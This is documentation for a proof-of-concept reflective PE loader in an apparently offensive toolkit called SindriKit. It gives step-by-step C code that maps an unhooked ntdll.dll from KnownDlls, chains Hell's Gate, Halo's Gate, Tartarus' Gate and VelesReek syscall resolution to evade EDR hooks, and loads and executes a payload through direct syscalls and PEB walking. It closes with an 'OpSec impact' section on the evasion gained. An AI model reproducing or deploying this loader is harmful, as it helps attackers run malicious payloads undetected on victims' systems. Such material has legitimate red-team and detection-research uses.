# PoC: loader_nowinapi

**Location:** `pocs/loader_nowinapi/`

This PoC drops the entire Win32 API layer. It retrieves a clean `ntdll.dll` from KnownDlls, configures a cascading SSN resolution pipeline, and then loads the payload using only direct kernel syscalls and PEB walking.

## What it demonstrates

- The full SindriKit bootstrapping sequence required before any native primitive can be used.
- The complete cascading syscall pipeline covering four EDR hook evasion strategies.
- That the loader's core logic is entirely unchanged — only the injected API tables differ from `loader_winapi`.

## Walkthrough

The bootstrapping phase must complete before the loader context is initialized.

### Step 1: Retrieve a clean `ntdll.dll` from KnownDlls

```c
PVOID clean_ntdll = NULL;

// Configure the KnownDlls loader to use Win32 wrappers for the initial bootstrap.
// (Native strategy is available once the syscall pipeline itself is armed.)
snd_status_t status = snd_map_knowndll(&snd_knowndlls_win, L"ntdll.dll", &clean_ntdll);
```

This maps a clean, pre-hook copy of `ntdll.dll` directly from the `\KnownDlls` Object Manager directory. The EDR's hooks on the PEB-resident copy do not exist in this mapping.

### Step 2: Feed the clean base to the global cache

```c
snd_set_ntdll(clean_ntdll);
```

This globally registers the unhooked `ntdll.dll` base. It will be used by the syscall resolution pipeline to extract unhooked stub bytes, and by the Native module API (`snd_mod_native`) to implicitly resolve APIs like `LdrLoadDll` without additional PEB lookups.

### Step 3: Configure the cascading syscall pipeline

```c
snd_set_syscall_strategy(snd_hell_extract_syscall);
snd_add_syscall_strategy(snd_halo_extract_syscall);
snd_add_syscall_strategy(snd_tartarus_extract_syscall);
snd_add_syscall_strategy(snd_veles_extract_syscall);
```

`snd_resolve_syscall` will now attempt each strategy in order, returning on the first success. This covers unhooked stubs (Hell's Gate), `0xE9`-hooked stubs (Halo's Gate), `0xEB`-hooked stubs (Tartarus' Gate), and the `syscall`-anchor fallback (VelesReek).

### Step 4: Load the payload and initialize the loader context

```c
snd_buffer_t payload = { ... };  // raw PE bytes from disk

snd_loader_ctx_t ctx = {0};
ctx.raw_source = &payload;
ctx.mem_api    = &snd_mem_native;  // -> NtAllocateVirtualMemory via direct syscall
ctx.mod_api    = &snd_mod_native;  // -> PEB walking + manual export table parsing
```

### Step 5: Execute

```c
snd_status_t s = snd_prepare_reflective_image(&ctx);
if (s.code != SND_SUCCESS) {
    snd_status_print(s);
    return 1;
}

s = snd_execute_reflective_image(&ctx);
```

**OpSec impact:** `VirtualAlloc` and `VirtualProtect` are never called. Memory allocation goes directly to `NtAllocateVirtualMemory` via the SSN resolved from the clean KnownDlls ntdll copy. Import resolution uses PEB walking for module base lookup and manual export table parsing for symbol resolution.
